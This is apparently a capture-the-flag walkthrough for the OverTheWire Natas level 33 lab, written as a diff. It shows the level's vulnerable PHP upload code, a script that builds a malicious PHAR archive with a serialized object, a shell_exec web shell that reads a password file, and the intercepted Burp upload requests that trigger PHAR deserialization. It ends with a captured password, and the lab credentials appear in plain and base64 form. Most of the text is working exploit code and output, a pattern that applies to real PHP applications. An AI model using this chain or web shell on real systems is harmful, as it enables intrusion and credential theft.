@@ -1,0 +1,272 @@
+PASSWORD: 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
+
+*WEB BROWSER*
+URL: http://natas33.natas.labs.overthewire.org/
+*BROWSE AND UPLOAD FILE CREATED ON PREVIOULY LEVEL natas30.py
+
+URLhttp://natas33.natas.labs.overthewire.org/index.php
+Can you get it right?
+The update has been uploaded to: /natas33/upload/r88dnrbialicgdnfvb7lq6krol
+Firmware upgrad initialised.
+Failur! MD5sum mismatch!  <----------
+Upload Firmware Update:
+
+*VIEW SOURCECODE*
+ <html>
+    <head>
+        <!-- This stuff in the header has nothing to do with the level -->
+        <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+        <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+        <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+        <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+        <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+        <script>var wechallinfo = { "level": "natas33", "pass": "<censored>" };</script></head>
+    </head>
+    <body>
+        <?php
+            // graz XeR, the first to solve it! thanks for the feedback!
+            // ~morla
+            class Executor{  <----------OBJECT
+                private $filename=""; 
+                private $signature='adeafbadbabec0dedabada55ba55d00d';
+                private $init=False;
+
+                function __construct(){
+                    $this->filename=$_POST["filename"];
+                    if(filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
+                        echo "File is too big<br>";
+                    }
+                    else {
+                        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename)) {
+                            echo "The update has been uploaded to: /natas33/upload/$this->filename<br>";
+                            echo "Firmware upgrad initialised.<br>";
+                        }
+                        else{
+                            echo "There was an error uploading the file, please try again!<br>";
+                        }
+                    }
+                }
+
+                function __destruct(){
+                    // upgrade firmware at the end of this script
+
+                    // "The working directory in the script shutdown phase can be different with some SAPIs (e.g. Apache)."
+                    chdir("/natas33/upload/");
+                    if(md5_file($this->filename) == $this->signature){
+                        echo "Congratulations! Running firmware update: $this->filename <br>";
+                        passthru("php " . $this->filename);
+                    }
+                    else{
+                        echo "Failur! MD5sum mismatch!<br>";
+                    }
+                }
+            }
+        ?>
+
+        <h1>natas33</h1>
+        <div id="content">
+            <h2>Can you get it right?</h2>
+
+            <?php
+                session_start();
+                if(array_key_exists("filename", $_POST) and array_key_exists("uploadedfile",$_FILES)) {
+                    new Executor();
+                }
+            ?>
+            <form enctype="multipart/form-data" action="index.php" method="POST">
+                <input type="hidden" name="MAX_FILE_SIZE" value="4096" />
+                <input type="hidden" name="filename" value="<?php echo session_id(); ?>" />
+                Upload Firmware Update:<br/>
+                <input name="uploadedfile" type="file" /><br />
+                <input type="submit" value="Upload File" />
+            </form>
+
+            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+        </div>
+    </body>
+</html>
+
+*OBJECT -> PHP ARCHIVE -> SEND -> PHAR://URL*
+
+NATAS33.PHP
+ <?php
+     
+       class Executor{
+       	   private $filename="ra6narok.php"; 
+           private $signature=True;
+	   private $init=False;
+       }
+
+  $phar = new Phar('natas.phar');
+  $phar->startBuffering();
+  $phar->addFromString('test.txt','text');
+  $phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+  $object = new Executor();
+  $object->data = 'rips';
+  $phar->setMetadata($object);
+  $phar->stopBuffering();
+
+?>
+
+
+ra6narok.php
+<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>
+
+
+
+
+
+*TERMINAL*
+php -d phar.readonly=false natas33.php   <----------To Create natas.phar
+
+
+*WEB BROWSER*
+URL: http://natas33.natas.labs.overthewire.org/index.php
+*BROWSE ra6narok.php
+
+*BURP SUITE*
+*TOGGLE PROXY*
+*TOGGLE INTERCEPT IS ON*
+
+POST /index.php HTTP/1.1
+Host: natas33.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------225577573930001701802272260220
+Content-Length: 562
+Origin: http://natas33.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
+Connection: close
+Referer: http://natas33.natas.labs.overthewire.org/index.php
+Cookie: _ga_RD0K2239G0=GS1.1.1718037651.6.0.1718037651.0.0.0; _ga=GA1.1.54566035.1717921097; PHPSESSID=r88dnrbialicgdnfvb7lq6krol
+Upgrade-Insecure-Requests: 1
+
+-----------------------------225577573930001701802272260220
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+4096
+-----------------------------225577573930001701802272260220
+Content-Disposition: form-data; name="filename"
+
+ra6narok.php  <----------------------------------------------------CHANGE FILE NAME*
+-----------------------------225577573930001701802272260220
+Content-Disposition: form-data; name="uploadedfile"; filename="ra6narok.php"
+Content-Type: application/x-php
+
+<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>
+
+-----------------------------225577573930001701802272260220--
+
+*FORWARD*
+*TOGGLE INTERCEPT IS OFF*
+
+*WEB BROWSER*
+URL: http://natas33.natas.labs.overthewire.org/index.php
+Can you get it right?
+The update has been uploaded to: /natas33/upload/ra6narok.php
+Firmware upgrad initialised.
+Failur! MD5sum mismatch!
+Upload Firmware Update:
+
+*WEB BROWSER*
+URL: http://natas33.natas.labs.overthewire.org/index.php
+*BROWSE natas.phar
+
+*BURP SUITE*
+*TOGGLE PROXY*
+*TOGGLE INTERCEPT IS ON*
+POST /index.php HTTP/1.1
+Host: natas33.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------344399204542103718602351089765
+Content-Length: 782
+Origin: http://natas33.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
+Connection: close
+Referer: http://natas33.natas.labs.overthewire.org/index.php
+Cookie: _ga_RD0K2239G0=GS1.1.1718037651.6.0.1718037651.0.0.0; _ga=GA1.1.54566035.1717921097; PHPSESSID=r88dnrbialicgdnfvb7lq6krol
+Upgrade-Insecure-Requests: 1
+
+-----------------------------344399204542103718602351089765
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+4096
+-----------------------------344399204542103718602351089765
+Content-Disposition: form-data; name="filename"
+
+natas.phar  <-----------------------------------------CHANGE FILE NAME TO natas.phar
+-----------------------------344399204542103718602351089765
+Content-Disposition: form-data; name="uploadedfile"; filename="natas.phar"
+Content-Type: application/octet-stream
+
+<?php __HALT_COMPILER(); ?>
+
+*SEND TO REPEATER*
+*FORWARD*
+*TOGGLE INTERCEPT IS OFF*
+
+*WEB BROWSER*
+URL: http://natas33.natas.labs.overthewire.org/index.php 
+Can you get it right?
+The update has been uploaded to: /natas33/upload/natas.phar
+Firmware upgrad initialised.
+Failur! MD5sum mismatch!
+Upload Firmware Update:
+
+*BURP SUITE*
+*TOGGLE REPEATER*
+POST /index.php HTTP/1.1
+Host: natas33.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------344399204542103718602351089765
+Content-Length: 782
+Origin: http://natas33.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMzMzoydjluRGxiU0Y3anZhd2FDbmNyNVo5a1N6a21CZW9DSg==
+Connection: close
+Referer: http://natas33.natas.labs.overthewire.org/index.php
+Cookie: _ga_RD0K2239G0=GS1.1.1718037651.6.0.1718037651.0.0.0; _ga=GA1.1.54566035.1717921097; PHPSESSID=r88dnrbialicgdnfvb7lq6krol
+Upgrade-Insecure-Requests: 1
+
+-----------------------------344399204542103718602351089765
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+4096
+-----------------------------344399204542103718602351089765
+Content-Disposition: form-data; name="filename"
+
+phar://natas.phar/test.text  <----------------------------CHANGE FILENAME TO phar://natas.phar/test.text
+-----------------------------344399204542103718602351089765
+Content-Disposition: form-data; name="uploadedfile"; filename="natas.phar"
+Content-Type: application/octet-stream
+
+<?php __HALT_COMPILER(); ?>
+
+*RIGHT CLICK*
+*SHOW RESPONSE IN BROWSER*
+
+*WEB BROWSER*
+URL: http://natas33.natas.labs.overthewire.org/index.php
+Can you get it right?
+
+Warning: move_uploaded_file(/natas33/upload/phar://natas.phar/test.text): failed to open stream: No such file or directory in /var/www/natas/natas33/index.php on line 27
+
+Warning: move_uploaded_file(): Unable to move '/var/lib/php/uploadtmp/phpjz4oYS' to '/natas33/upload/phar://natas.phar/test.text' in /var/www/natas/natas33/index.php on line 27
+There was an error uploading the file, please try again!
+
+Warning: md5_file(phar://natas.phar/test.text): failed to open stream: phar error: "test.text" is not a file in phar "natas.phar" in /var/www/natas/natas33/index.php on line 42
+Failur! MD5sum mismatch!
+Upload Firmware Update:
+
+View sourcecode
+Congratulations! Running firmware update: ra6narok.php
+j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY <----------PASSWORD
